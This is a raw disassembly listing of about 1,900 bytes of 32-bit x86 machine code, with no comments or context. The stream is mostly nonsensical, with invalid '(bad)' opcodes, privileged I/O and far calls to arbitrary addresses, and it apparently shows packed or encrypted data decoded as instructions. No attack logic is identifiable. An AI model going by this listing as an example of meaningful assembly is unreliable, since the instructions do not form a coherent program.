  412ab9:	add    al,bh
  412abb:	dec    esi
  412abc:	bound  ebp,QWORD PTR [ebx-0x2]
  412abf:	outs   dx,BYTE PTR ds:[esi]
  412ac0:	sti    
  412ac1:	xchg   DWORD PTR [eax],ecx
  412ac3:	loopne 0x412aff
  412ac5:	jmp    0x412b40
  412ac7:	rol    esi,0xa2
  412aca:	aas    
  412acb:	out    0x24,eax
  412acd:	clc    
  412ace:	adc    cl,BYTE PTR [ebx+ebp*1+0x7f]
  412ad2:	popf   
  412ad3:	fidiv  DWORD PTR [edi+0x6a22a081]
  412ad9:	clc    
  412ada:	xor    cl,BYTE PTR [ebp+0xb]
  412add:	call   0x636:0x4415729a
  412ae4:	pop    eax
  412ae5:	pop    ds
  412ae6:	xchg   cl,bl
  412ae8:	aam    0x9f
  412aea:	lods   al,BYTE PTR ds:[esi]
  412aeb:	(bad)  
  412aed:	pop    ebp
  412aee:	inc    edi
  412aef:	or     DWORD PTR [eax-0x66],edi
  412af2:	(bad)  
  412af3:	add    bh,BYTE PTR [edx]
  412af5:	mov    al,ds:0x2b53ab55
  412afa:	cli    
  412afb:	int3   
  412afc:	cmc    
  412afd:	xchg   esi,eax
  412afe:	and    BYTE PTR [eax],bh
  412b00:	sbb    DWORD PTR [esp+ebx*2+0x0],ebx
  412b04:	sub    BYTE PTR [edx-0x60],0xe
  412b08:	add    al,0x3c
  412b0a:	adc    al,0x3a
  412b0c:	pop    ds
  412b0d:	sbb    al,0x7
  412b0f:	dec    esi
  412b10:	lds    edi,FWORD PTR [eax-0x432c5a6d]
  412b16:	xchg   edi,eax
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	std    
  412b19:	cmp    eax,0x1771f0af
  412b1e:	dec    edi
  412b1f:	aad    0xa6
  412b21:	add    eax,0x36c16505
  412b26:	mov    cl,0xdb
  412b28:	add    bh,BYTE PTR [eax+0x3cf4d51c]
  412b2e:	(bad)  
  412b2f:	mov    esp,0x7ec50445
  412b34:	jecxz  0x412b97
  412b36:	and    cl,BYTE PTR [edi]
  412b38:	and    al,0x41
  412b3a:	fldcw  WORD PTR [edx+esi*4-0x29]
  412b3e:	out    0xc0,eax
  412b40:	inc    eax
  412b41:	cmp    dl,bh
  412b43:	mov    WORD PTR [eax],?
  412b45:	(bad)  
  412b46:	sub    al,0xc4
  412b48:	jb     0x412ba9
  412b4a:	das    
  412b4b:	stos   BYTE PTR es:[edi],al
  412b4c:	mov    bh,0x23
  412b4e:	dec    ebp
  412b4f:	sub    edx,eax
  412b51:	push   eax
  412b52:	cwde   
  412b53:	mov    edi,eax
  412b55:	or     eax,0x7e9522
  412b5a:	test   edx,eax
  412b5c:	fiadd  WORD PTR [esi-0x3aafc6e]
  412b62:	ret    
  412b63:	jge    0x412b74
  412b65:	std    
  412b66:	mov    edi,0x8251d95b
  412b6b:	or     eax,0x8e3037be
  412b70:	std    
  412b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b72:	call   FWORD PTR [edx+0xff71be1]
  412b78:	sub    eax,0xf7dfb963
  412b7d:	popa   
  412b7e:	jl     0x412bea
  412b80:	xchg   ebx,eax
  412b81:	sbb    bh,ah
  412b83:	pcmpeqw mm2,QWORD PTR [ebx-0x2b]
  412b87:	mov    eax,0xb160b0c0
  412b8c:	arpl   WORD PTR [ecx-0x3d],si
  412b8f:	bound  eax,QWORD PTR [edi+0x17]
  412b92:	add    BYTE PTR [esi+0x3867175],dh
  412b98:	loop   0x412bde
  412b9a:	jnp    0x412b75
  412b9c:	pop    edi
  412b9d:	cwde   
  412b9e:	push   ecx
  412b9f:	loop   0x412b49
  412ba1:	shr    BYTE PTR [eax],1
  412ba3:	ins    BYTE PTR es:[edi],dx
  412ba4:	adc    esp,esi
  412ba6:	add    al,0xf4
  412ba8:	dec    eax
  412ba9:	and    al,0xa0
  412bab:	shl    DWORD PTR [edi-0x3e],0xcd
  412baf:	out    dx,eax
  412bb0:	in     eax,dx
  412bb1:	stc    
  412bb2:	cwde   
  412bb3:	or     eax,0x9a7e564d
  412bb8:	into   
  412bb9:	xchg   ebx,eax
  412bba:	neg    BYTE PTR [esi]
  412bbc:	into   
  412bbd:	mov    ebx,0x8bd0888b
  412bc2:	stos   BYTE PTR es:[edi],al
  412bc3:	push   ss
  412bc4:	retf   
  412bc5:	(bad)  
  412bc6:	in     eax,0xd1
  412bc8:	cli    
  412bc9:	and    DWORD PTR [eax-0x64],esi
  412bcc:	push   eax
  412bcd:	sub    cl,BYTE PTR [esp+ecx*4]
  412bd0:	fdivr  QWORD PTR [edx+ebx*4+0x6313e43]
  412bd7:	dec    esp
  412bd8:	jb     0x412bbc
  412bda:	popf   
  412bdb:	int    0x94
  412bdd:	(bad)  
  412bde:	xchg   ecx,eax
  412bdf:	outs   dx,DWORD PTR ds:[esi]
  412be0:	imul   eax,DWORD PTR [ecx+edi*4-0x19447408],0x7e
  412be8:	adc    bh,BYTE PTR [edi+0x4541cbd5]
  412bee:	jmp    0x412c08
  412bf0:	aas    
  412bf1:	mov    cl,BYTE PTR [edx+0x72]
  412bf4:	xor    DWORD PTR [ebp-0x36],esi
  412bf7:	repz fneni(8087 only) 
  412bfa:	sub    cl,ah
  412bfc:	push   ecx
  412bfd:	into   
  412bfe:	icebp  
  412bff:	loope  0x412c7d
  412c01:	mov    ecx,0x2b95bc92
  412c06:	imul   edi,eax,0xdecf3103
  412c0c:	in     eax,dx
  412c0d:	clc    
  412c0e:	shr    dh,cl
  412c10:	pop    esp
  412c11:	mov    eax,0x978f6171
  412c16:	mov    ds:0x3a2b5403,eax
  412c1b:	fwait
  412c1c:	push   cs
  412c1d:	in     eax,0x57
  412c1f:	in     al,0x18
  412c21:	sbb    edx,ebp
  412c23:	adc    eax,0xd0c079b7
  412c28:	jg     0x412bd2
  412c2a:	sti    
  412c2b:	push   esp
  412c2c:	fsubr  DWORD PTR [ecx+eiz*8+0x3f]
  412c30:	inc    esi
  412c31:	adc    eax,0xd416c899
  412c36:	retf   0x43dd
  412c39:	dec    ecx
  412c3a:	lods   eax,DWORD PTR ds:[esi]
  412c3b:	mov    al,0xda
  412c3d:	pop    esi
  412c3e:	mov    ebx,db7
  412c41:	push   0x6b
  412c43:	pop    ss
  412c44:	mov    dl,BYTE PTR [ebx-0x2811ebb2]
  412c4a:	(bad)  
  412c4b:	xlat   BYTE PTR ds:[ebx]
  412c4c:	(bad)  
  412c4d:	scas   eax,DWORD PTR es:[edi]
  412c4e:	sbb    al,BYTE PTR [esi-0x18]
  412c51:	addr16 and eax,0x8eaafda0
  412c57:	fld    QWORD PTR [edx-0x70]
  412c5a:	or     edx,DWORD PTR [ecx-0x3f]
  412c5d:	mov    cs,WORD PTR [ebx+0x6b]
  412c60:	and    bh,cl
  412c62:	test   eax,0x188f29f4
  412c67:	(bad)  
  412c68:	sti    
  412c69:	imul   ebx,ebx,0xeb2e736c
  412c6f:	in     eax,0x76
  412c71:	xchg   DWORD PTR ds:[edi+eax*4-0x6f],esp
  412c76:	(bad)  [esi-0x9]
  412c79:	leave  
  412c7a:	xor    eax,0xe3ab9fe2
  412c7f:	jmp    0x78f7:0xe345bdc4
  412c86:	ret    0xd1f
  412c89:	sbb    eax,DWORD PTR [ecx+0x6e]
  412c8c:	or     al,0x4b
  412c8e:	out    dx,al
  412c8f:	mov    WORD PTR [esi-0x4576a748],gs
  412c95:	push   esi
  412c96:	aad    0x4f
  412c98:	shl    BYTE PTR ds:0xc9df5e86,0xb2
  412c9f:	retf   
  412ca0:	or     eax,0xf166d9fe
  412ca5:	push   ebx
  412ca6:	push   ss
  412ca7:	jno    0x412d11
  412ca9:	int    0x92
  412cab:	jbe    0x412cdf
  412cad:	xor    bl,BYTE PTR [esi+eiz*4-0xf6359ff]
  412cb4:	mov    ds:0x33e7a43c,eax
  412cb9:	ins    DWORD PTR es:[edi],dx
  412cba:	xchg   ebx,eax
  412cbb:	cmp    eax,0xa45b3ce4
  412cc0:	das    
  412cc1:	inc    esi
  412cc2:	sub    ecx,esp
  412cc4:	imul   ecx,DWORD PTR [edx],0x72d0b6a6
  412cca:	xchg   esp,eax
  412ccb:	mov    esp,0x96d74097
  412cd0:	sbb    al,0x6e
  412cd2:	mov    eax,0xcb02b52b
  412cd7:	add    al,0xeb
  412cd9:	cmp    al,0xdc
  412cdb:	lods   eax,DWORD PTR ds:[esi]
  412cdc:	sub    al,0xb4
  412cde:	or     al,0x9
  412ce0:	mov    ebx,0x671ba506
  412ce5:	lds    ebx,FWORD PTR [edx+ecx*2]
  412ce8:	retf   0x9252
  412ceb:	or     eax,0x4ff3f689
  412cf0:	nop
  412cf1:	aaa    
  412cf2:	sub    cl,BYTE PTR [edx-0x438ac29f]
  412cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cf9:	cdq    
  412cfa:	arpl   bx,ax
  412cfc:	cmp    eax,0x6fa5c51d
  412d01:	repz dec ecx
  412d03:	mov    cl,0xb7
  412d05:	sti    
  412d06:	pop    ss
  412d07:	in     al,dx
  412d08:	ret    
  412d09:	dec    ebp
  412d0a:	rcl    bh,0x30
  412d0d:	ins    BYTE PTR es:[edi],dx
  412d0e:	fwait
  412d0f:	jg     0x412cc2
  412d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d12:	test   al,0x39
  412d14:	jmp    0x412cd9
  412d16:	dec    esp
  412d17:	fwait
  412d18:	push   es
  412d19:	adc    al,0xab
  412d1b:	pop    edx
  412d1c:	cli    
  412d1d:	int3   
  412d1e:	and    eax,0x534447f9
  412d23:	adc    DWORD PTR [ecx],ecx
  412d25:	lahf   
  412d26:	int3   
  412d27:	(bad)  
  412d28:	jl     0x412d8e
  412d2a:	ins    DWORD PTR es:[edi],dx
  412d2b:	mov    al,0x23
  412d2d:	or     eax,0xa938149a
  412d32:	mov    DWORD PTR [ebp+ecx*1-0xc523ff],esp
  412d39:	or     eax,0xdbd3ee03
  412d3e:	je     0x412d9d
  412d40:	sub    edx,DWORD PTR [esi-0x38]
  412d43:	xor    eax,0xa7fb89dc
  412d48:	push   edx
  412d49:	popa   
  412d4a:	mov    edx,0xbe9427e5
  412d4f:	push   0x24
  412d51:	cs sub ecx,ebx
  412d54:	add    bl,dh
  412d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d57:	mov    edi,?
  412d59:	hlt    
  412d5a:	test   al,0x4
  412d5c:	jle    0x412dba
  412d5e:	pop    esp
  412d5f:	enter  0xaef,0x8
  412d63:	ja     0x412d86
  412d65:	cmp    DWORD PTR [edx],ebx
  412d67:	xor    DWORD PTR [ebx],edx
  412d69:	dec    eax
  412d6a:	(bad)  
  412d6b:	mov    edx,0xf7199750
  412d70:	xchg   edi,eax
  412d71:	jb     0x412de9
  412d73:	or     BYTE PTR [eax+eax*1+0x26e609f2],al
  412d7a:	sub    eax,DWORD PTR ds:0x24d5d5bd
  412d80:	xchg   ebp,eax
  412d81:	jno    0x412da9
  412d83:	xor    DWORD PTR [esi],ebx
  412d85:	scas   eax,DWORD PTR es:[edi]
  412d86:	mov    dl,0xe9
  412d88:	push   0x4b11ee26
  412d8d:	retf   0x2bde
  412d90:	out    dx,al
  412d91:	sub    bh,bh
  412d93:	ins    BYTE PTR es:[edi],dx
  412d94:	(bad)  
  412d95:	sbb    eax,0xaab26228
  412d9a:	mov    ds:0xbc7b7db4,eax
  412d9f:	xchg   esi,eax
  412da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da1:	sti    
  412da2:	sub    DWORD PTR [esi+0x19],eax
  412da5:	test   DWORD PTR [ecx-0x73],esp
  412da8:	push   0xf
  412daa:	inc    eax
  412dab:	outs   dx,DWORD PTR ds:[esi]
  412dac:	pop    ds
  412dad:	dec    esp
  412dae:	cs clc 
  412db0:	inc    ecx
  412db1:	arpl   WORD PTR [eax],bp
  412db3:	mov    al,ds:0xc2b2e932
  412db8:	push   0xfd8e58be
  412dbd:	stc    
  412dbe:	sti    
  412dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dc0:	adc    ebx,DWORD PTR [eax-0x58]
  412dc3:	xor    edx,ecx
  412dc5:	ins    BYTE PTR es:[edi],dx
  412dc6:	sbb    eax,0x39419c48
  412dcb:	das    
  412dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dcd:	ret    0x85b2
  412dd0:	xor    esp,DWORD PTR [ecx]
  412dd2:	inc    eax
  412dd3:	sub    edi,edx
  412dd5:	cmp    dh,BYTE PTR [ebp+0x22]
  412dd8:	xor    eax,0xb5d6a5e0
  412ddd:	popf   
  412dde:	or     cl,bl
  412de0:	cmp    al,0xc8
  412de2:	and    eax,0x74c9e51f
  412de7:	fs fadd st(6),st
  412dea:	pop    esi
  412deb:	rcl    esi,1
  412ded:	call   0x740a2ee9
  412df2:	dec    ebp
  412df3:	and    al,0x56
  412df5:	dec    esi
  412df6:	xchg   edi,eax
  412df7:	les    edi,FWORD PTR [ecx]
  412df9:	cmp    ch,cl
  412dfb:	dec    eax
  412dfc:	mov    esp,0x384d65
  412e01:	jns    0x412da6
  412e03:	(bad)  
  412e05:	and    ah,bh
  412e07:	ja     0x412daa
  412e09:	push   0x499a2ad7
  412e0e:	pop    ecx
  412e0f:	nop
  412e10:	int    0x3
  412e12:	cmp    eax,0xc54dc8c4
  412e17:	or     edi,DWORD PTR [ebp-0x36]
  412e1a:	mov    eax,ds:0xb8fc98f6
  412e1f:	mov    esi,0x163a8d96
  412e24:	pusha  
  412e25:	fcom   QWORD PTR [edi-0x59db0df2]
  412e2b:	sbb    al,0xc5
  412e2d:	sbb    al,0x3f
  412e2f:	pop    edi
  412e30:	pop    edx
  412e31:	add    ch,BYTE PTR [edx+0x6170c52]
  412e37:	cwde   
  412e38:	cmp    DWORD PTR [ebp-0x9adaed0],ebx
  412e3e:	in     eax,dx
  412e3f:	and    ebp,DWORD PTR [eax-0x36c41236]
  412e45:	sbb    al,0x89
  412e47:	mov    bl,0x8b
  412e49:	or     BYTE PTR [ebx+0x18],0x75
  412e4d:	in     al,0xe0
  412e4f:	cwde   
  412e50:	add    cl,dl
  412e52:	jl     0x412ddc
  412e54:	mov    ?,WORD PTR [esi-0x1b]
  412e57:	xchg   esp,eax
  412e58:	mov    ebp,0xb904f3e
  412e5d:	enter  0x6237,0x82
  412e61:	cmp    ebx,esi
  412e63:	dec    ebp
  412e64:	out    0x72,eax
  412e66:	sub    DWORD PTR [eax+0x16],esp
  412e69:	test   edi,ebp
  412e6b:	and    dl,BYTE PTR [edi+0x72]
  412e6e:	jnp    0x412e80
  412e70:	mov    cl,0x9
  412e72:	lods   al,BYTE PTR ds:[esi]
  412e73:	mov    edi,0x37090e5f
  412e78:	fbld   TBYTE PTR [ebp+ebx*4-0x1352050]
  412e7f:	mov    al,ds:0x5eecf806
  412e84:	push   edx
  412e85:	or     bh,cl
  412e87:	jle    0x412e4e
  412e89:	and    DWORD PTR [ecx+esi*2+0x54],edx
  412e8d:	sbb    edx,esi
  412e8f:	add    ah,bh
  412e91:	xchg   ecx,eax
  412e92:	jmp    0x412e59
  412e94:	fs adc al,0x52
  412e97:	push   esp
  412e98:	mov    ecx,0xdec881a9
  412e9d:	or     ebp,eax
  412e9f:	iret   
  412ea0:	je     0x412e61
  412ea2:	sbb    ch,0x91
  412ea5:	in     eax,0x21
  412ea7:	bound  edx,QWORD PTR [edx]
  412ea9:	test   DWORD PTR [esi+0x4c],0xdcc0a23e
  412eb0:	sub    eax,0x7fb57f24
  412eb5:	lods   al,BYTE PTR ds:[esi]
  412eb6:	jne    0x412e76
  412eb8:	sub    eax,0xda57df80
  412ebd:	cmp    al,0x6e
  412ebf:	cmp    esp,ecx
  412ec1:	mov    esi,0x409adfed
  412ec6:	jge    0x412f33
  412ec8:	mov    eax,0xe56f0ad6
  412ecd:	dec    ebx
  412ece:	add    BYTE PTR [esi],0x4a
  412ed1:	nop
  412ed2:	in     eax,0x35
  412ed4:	arpl   WORD PTR [edx+0x23],ax
  412ed7:	push   esi
  412ed8:	pushf  
  412ed9:	cmp    DWORD PTR [edi+0x19],edx
  412edc:	inc    esp
  412edd:	int    0x6f
  412edf:	icebp  
  412ee0:	cmc    
  412ee1:	adc    al,0xe1
  412ee3:	mov    ebx,0x52ca9dc0
  412ee8:	sbb    DWORD PTR [edi+0x6fb15563],esp
  412eee:	shl    BYTE PTR [esi-0x22be6541],cl
  412ef4:	aad    0xe9
  412ef6:	repz or ebp,DWORD PTR [eax+0x753abe2e]
  412efd:	fadd   DWORD PTR [eax]
  412eff:	dec    edi
  412f00:	sbb    edi,0x8c460f6d
  412f06:	in     al,0xd2
  412f08:	pop    edi
  412f09:	xlat   BYTE PTR ds:[ebx]
  412f0a:	jg     0x412eb5
  412f0c:	jae    0x412ea8
  412f0e:	xor    BYTE PTR [edx],ah
  412f10:	dec    eax
  412f11:	stc    
  412f12:	daa    
  412f13:	jl     0x412f18
  412f15:	sbb    dh,BYTE PTR [edx]
  412f17:	add    dl,BYTE PTR [eax+0x7b]
  412f1a:	and    al,0x69
  412f1c:	sar    BYTE PTR [ebx],cl
  412f1e:	jg     0x412efd
  412f20:	test   DWORD PTR [ebx-0x1e],0x331a5d1
  412f27:	fs (bad) 
  412f29:	sbb    DWORD PTR [edx+edx*2],edx
  412f2c:	iret   
  412f2d:	sti    
  412f2e:	mov    ecx,0x382d7c0b
  412f33:	fbstp  TBYTE PTR [ecx+0x69]
  412f36:	scas   al,BYTE PTR es:[edi]
  412f37:	daa    
  412f38:	jns    0x412f2a
  412f3a:	xor    bl,BYTE PTR [eax-0x77]
  412f3d:	sub    eax,0xdc129fd4
  412f42:	fimul  WORD PTR [ebx-0x2f]
  412f45:	lds    esp,FWORD PTR [ebx+eiz*4+0x5d]
  412f49:	lods   eax,DWORD PTR ds:[esi]
  412f4a:	les    ebx,FWORD PTR [eax-0x2d]
  412f4d:	mov    dl,0x73
  412f4f:	in     al,0x16
  412f51:	inc    edi
  412f52:	inc    ebx
  412f53:	lods   eax,DWORD PTR ds:[esi]
  412f54:	pxor   mm2,QWORD PTR [esp+edi*4]
  412f58:	mul    DWORD PTR [eax-0x12f9ab3c]
  412f5e:	fwait
  412f5f:	imul   eax,edi,0x3
  412f62:	cli    
  412f63:	dec    ecx
  412f64:	in     eax,dx
  412f65:	jae    0x412f4c
  412f67:	out    dx,al
  412f68:	cs clc 
  412f6a:	mov    al,fs:0xe754856b
  412f70:	inc    ecx
  412f71:	fnstsw WORD PTR [eax-0x1f4e5e5f]
  412f77:	cmp    al,0x91
  412f79:	div    BYTE PTR ds:0x6b5194b0
  412f7f:	sahf   
  412f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f81:	int3   
  412f82:	xchg   DWORD PTR [ecx],ebp
  412f84:	test   DWORD PTR [esi+0x5c],eax
  412f87:	inc    edx
  412f88:	adc    ebx,DWORD PTR [ebx+0xf6bfa4f]
  412f8e:	jno    0x412f8c
  412f90:	xchg   ecx,eax
  412f91:	stc    
  412f92:	xchg   esp,eax
  412f93:	in     eax,0xa1
  412f95:	in     al,dx
  412f96:	lock mov ebx,0x80ac8bf8
  412f9c:	pusha  
  412f9d:	popf   
  412f9e:	retf   
  412f9f:	out    0xa0,al
  412fa1:	mov    ds:0xe99d1797,eax
  412fa6:	mov    ebp,0xc61178a7
  412fab:	out    dx,al
  412fac:	xor    BYTE PTR [ecx],dh
  412fae:	pusha  
  412faf:	mov    BYTE PTR [edx+0x73798117],0xaa
  412fb6:	xchg   ecx,eax
  412fb7:	xchg   BYTE PTR [ebx-0x56],al
  412fba:	cmp    DWORD PTR [ebx-0x91e82c],0x8584f43f
  412fc4:	jmp    0xe36b1c76
  412fc9:	call   0x73989238
  412fce:	outs   dx,BYTE PTR ds:[esi]
  412fcf:	pop    edi
  412fd0:	loope  0x412f9c
  412fd2:	sub    al,0x7c
  412fd4:	into   
  412fd5:	pushw  0x2f
  412fd8:	adc    eax,0xe656e06a
  412fdd:	stc    
  412fde:	pop    ds
  412fdf:	sub    esp,DWORD PTR [esi+0x433d7fed]
  412fe5:	stc    
  412fe6:	mov    ebx,0x17afe85
  412feb:	in     eax,0x3b
  412fed:	jo     0x412fd5
  412fef:	loope  0x413069
  412ff1:	jb     0x41306e
  412ff3:	mov    dh,0x73
  412ff5:	push   0xd8b2b698
  412ffa:	retf   
  412ffb:	xor    al,0xb7
  412ffd:	or     eax,0xa500923b
  413002:	mov    al,0x49
  413004:	jae    0x413009
  413006:	aam    0xd6
  413008:	ja     0x412fce
  41300a:	xor    eax,DWORD PTR [edx+0x6e]
  41300d:	daa    
  41300e:	ja     0x41300d
  413010:	int3   
  413011:	ret    
  413012:	dec    ecx
  413013:	sub    DWORD PTR [edx+0x4d],0x28bac821
  41301a:	push   0xf612608
  41301f:	mov    edi,0x4d7bd0af
  413024:	sub    ecx,edi
  413026:	pop    edx
  413027:	sti    
  413028:	ret    
  413029:	pop    edx
  41302a:	sub    BYTE PTR [ebp+0x4e],dl
  41302d:	aas    
  41302e:	xor    DWORD PTR [esi+0x4011a8c1],esi
  413034:	xchg   ebp,eax
  413035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413036:	test   DWORD PTR [edi+0x18],esp
  413039:	inc    ebx
  41303a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41303b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41303c:	sbb    DWORD PTR [edi+0x38],ebx
  41303f:	inc    edx
  413040:	dec    ebp
  413041:	outs   dx,DWORD PTR ds:[si]
  413043:	mov    dl,0x87
  413045:	cmp    al,0x86
  413047:	jle    0x41302a
  413049:	aam    0x61
  41304b:	xor    al,0x67
  41304d:	je     0x412fdc
  41304f:	fld    QWORD PTR [edx-0x6c]
  413052:	add    BYTE PTR ds:0x5c11a19,ch
  413058:	xor    al,0x37
  41305a:	fstp   TBYTE PTR [edx+0x4d9729ad]
  413060:	push   ss
  413061:	out    dx,eax
  413062:	xchg   edi,eax
  413063:	sbb    bl,BYTE PTR [ecx]
  413065:	sbb    DWORD PTR [eax+edi*2-0x18fbdaf8],ecx
  41306c:	inc    esp
  41306d:	mov    db3,edi
  413070:	add    eax,0x9bfb7ecb
  413075:	pop    ds
  413076:	dec    ecx
  413077:	or     eax,0xc325286a
  41307c:	mov    eax,ds:0x49cfca51
  413081:	add    BYTE PTR [esi-0x16f72861],ah
  413087:	or     bl,ch
  413089:	xchg   edi,eax
  41308a:	push   ebx
  41308b:	adc    DWORD PTR gs:[edx-0x6345e046],esp
  413092:	fistp  WORD PTR [edi]
  413094:	jo     0x4130f3
  413096:	test   al,0x7d
  413098:	outs   dx,DWORD PTR ds:[esi]
  413099:	sbb    DWORD PTR [esi+eiz*2+0x70],0x6ba2e92
  4130a1:	cmp    ah,BYTE PTR [edx+0x19]
  4130a4:	sub    eax,0xa5f3f6e5
  4130a9:	xor    eax,0x43c4c72
  4130ae:	int    0x50
  4130b0:	mov    edi,0xa87c20d
  4130b5:	add    dl,BYTE PTR [ebp-0x1afed00c]
  4130bb:	hlt    
  4130bc:	cwde   
  4130bd:	jne    0x4130dd
  4130bf:	adc    BYTE PTR [edi-0x50],al
  4130c2:	xor    ecx,DWORD PTR [eax-0x317f731d]
  4130c8:	dec    esi
  4130c9:	rcl    DWORD PTR [edi],0x8e
  4130cc:	lds    ebp,FWORD PTR [edi+eiz*1+0x1827af2b]
  4130d3:	ret    0xbbba
  4130d6:	jo     0x413138
  4130d8:	or     al,0x96
  4130da:	es pop ebx
  4130dc:	in     eax,0x8b
  4130de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130df:	mov    cl,0xfc
  4130e1:	mov    ah,0xc8
  4130e3:	and    al,0x7d
  4130e5:	push   esp
  4130e6:	adc    BYTE PTR [ebx+0x32],dl
  4130e9:	add    BYTE PTR [esi-0x22],cl
  4130ec:	mov    al,ds:0x494df896
  4130f1:	pop    es
  4130f2:	test   eax,0xec33c3c1
  4130f7:	sub    dh,dl
  4130f9:	mov    ecx,0xe705c069
  4130fe:	popf   
  4130ff:	cmp    ebx,DWORD PTR [esi]
  413101:	push   ebp
  413102:	fstp   TBYTE PTR [ebp-0x217d232f]
  413108:	aad    0xe3
  41310a:	aas    
  41310b:	div    BYTE PTR fs:[esi]
  41310e:	mov    eax,0x430e7b21
  413113:	hlt    
  413114:	dec    ecx
  413115:	cmp    dl,BYTE PTR [ebp+0x831f601]
  41311b:	inc    esp
  41311c:	loope  0x4130c4
  41311e:	fst    st(2)
  413120:	push   esp
  413121:	sbb    dl,BYTE PTR [eax-0xc]
  413124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413125:	fimul  WORD PTR [eax+0x3]
  413128:	iret   
  413129:	add    DWORD PTR [ebx-0x3e],ecx
  41312c:	mov    esp,0xe8901a6b
  413131:	mov    es,WORD PTR [ecx]
  413133:	adc    esp,esi
  413135:	sahf   
  413136:	xor    dh,BYTE PTR [edi-0x5707f15b]
  41313c:	lds    esp,FWORD PTR [ecx]
  41313e:	or     eax,0x4a3c39d4
  413143:	push   ebx
  413144:	add    BYTE PTR [edx],0x80
  413147:	aas    
  413148:	retf   
  413149:	cmp    ebx,esp
  41314b:	push   esi
  41314c:	pushaw 
  41314e:	out    dx,eax
  41314f:	pop    edx
  413150:	cdq    
  413151:	and    edi,DWORD PTR [esi-0x539297aa]
  413157:	adc    esp,DWORD PTR [ecx-0x5b]
  41315a:	leave  
  41315b:	retw   0x43ed
  41315f:	jg     0x413118
  413161:	or     eax,0x83d24c50
  413166:	test   al,0x9b
  413168:	imul   edx,DWORD PTR [edx],0x22fd15e2
  41316e:	mov    eax,ds:0x434eaf57
  413173:	jl     0x41317f
  413175:	xor    al,0xf1
  413177:	ins    DWORD PTR es:[edi],dx
  413178:	xor    ecx,0xd566eeba
  41317e:	jl     0x41317b
  413180:	icebp  
  413181:	dec    ebx
  413182:	clc    
  413183:	pop    esi
  413184:	sbb    eax,0xc23029ce
  413189:	jle    0x41310d
  41318b:	mov    bh,0xc2
  41318d:	push   ds
  41318e:	inc    esi
  41318f:	cdq    
  413190:	aaa    
  413191:	mov    ebp,0x90818c14
  413196:	mov    bh,0x7d
  413198:	out    0x86,eax
  41319a:	icebp  
  41319b:	push   ss
  41319c:	cmp    ebx,DWORD PTR [edx+ebx*1]
  41319f:	push   0x53
  4131a1:	dec    ebp
  4131a2:	sub    eax,0x20bb4851
  4131a7:	xor    eax,0x74b5ad46
  4131ac:	adc    esp,ecx
  4131ae:	xchg   ecx,eax
  4131af:	in     eax,0x1e
  4131b1:	nop
  4131b2:	lahf   
  4131b3:	in     al,dx
  4131b4:	xchg   ebp,eax
  4131b5:	stos   BYTE PTR es:[edi],al
  4131b6:	shl    BYTE PTR [edx],1
  4131b8:	aaa    
  4131b9:	jl     0x41319e
  4131bb:	dec    edx
  4131bc:	adc    BYTE PTR [esi],0x29
  4131bf:	mov    edx,0xeb3d71b8
  4131c4:	mov    bh,0x30
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	call   0x9278:0xa33be8ea
  4131ce:	leave  
  4131cf:	and    eax,DWORD PTR [edx-0x58d7abfd]
  4131d5:	jb     0x413182
  4131d7:	xchg   esp,eax
  4131d8:	fistp  DWORD PTR [ebp+0x6f]
  4131db:	cwde   
  4131dc:	nop
  4131dd:	leave  
  4131de:	pop    ecx
  4131df:	inc    ecx
  4131e0:	rcr    BYTE PTR [ebp-0x70],0x71
  4131e4:	jle    0x413200
  4131e6:	into   
  4131e7:	cmc    
  4131e8:	out    dx,al
  4131e9:	frstor cs:0xb6c718b1
  4131f0:	xor    edx,DWORD PTR [ebx+0x75]
  4131f3:	daa    
  4131f4:	xor    ebx,ebx
  4131f6:	dec    ebp
  4131f7:	in     eax,0x13
  4131f9:	(bad)  
  4131fa:	mov    ah,0x82
  4131fc:	push   0x3d
  4131fe:	(bad)
  413201:	cld    
  413202:	mov    bl,0x39
  413204:	sti    
  413205:	or     eax,0x12f04439
  41320a:	xchg   edx,eax
  41320b:	fiadd  DWORD PTR [esi-0x44]
  41320e:	cmp    ah,al
  413210:	xchg   ebx,eax
  413211:	mov    eax,ds:0xbad72ffb
  413216:	xor    esi,DWORD PTR [edi*2-0x3ef1cb65]
  41321d:	sbb    al,0x60
  41321f:	add    bl,BYTE PTR [edi+0x71d9c31f]
  413225:	enter  0xf7d6,0x17
  413229:	pop    esi
  41322a:	push   ebp
  41322b:	push   0xdb18c816
  413230:	add    ebp,esp
  413232:	fs dec ebp
  413234:	test   BYTE PTR [edi+0x5],bh
  413237:	in     al,0xc6
  413239:	bound  eax,QWORD PTR [ebx-0x25a60e99]
  41323f:	fst    QWORD PTR ds:0x832b80f5
  413245:	cmc    
  413246:	and    dh,BYTE PTR [edi-0x268e8a43]
  41324c:	(bad)  
  41324d:	iret   
  41324e:	jae    0x4131e3
  413250:	lods   eax,DWORD PTR ds:[esi]
  413251:	and    ch,BYTE PTR [ecx+0x290864bb]
  413257:	mov    dl,BYTE PTR [ebx+0x47]
  41325a:	xor    DWORD PTR [ebp-0x14c8f9c],esp
  413260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413261:	xor    eax,0x69942f5
  413266:	test   eax,0x9198c851
  41326b:	or     ebx,DWORD PTR [eax+0x6c]
  41326e:	pop    ss
  41326f:	add    eax,0xea60eaf6
  413274:	xchg   edi,eax
  413275:	mov    dl,bh
  413277:	sub    eax,0x7c814c63
  41327c:	iret   
  41327d:	call   0x212a:0x98e056d9
  413284:	into   
  413285:	clc    
  413286:	add    ebx,DWORD PTR [ecx-0x62]
  413289:	test   al,al
  41328b:	push   0xa1605844
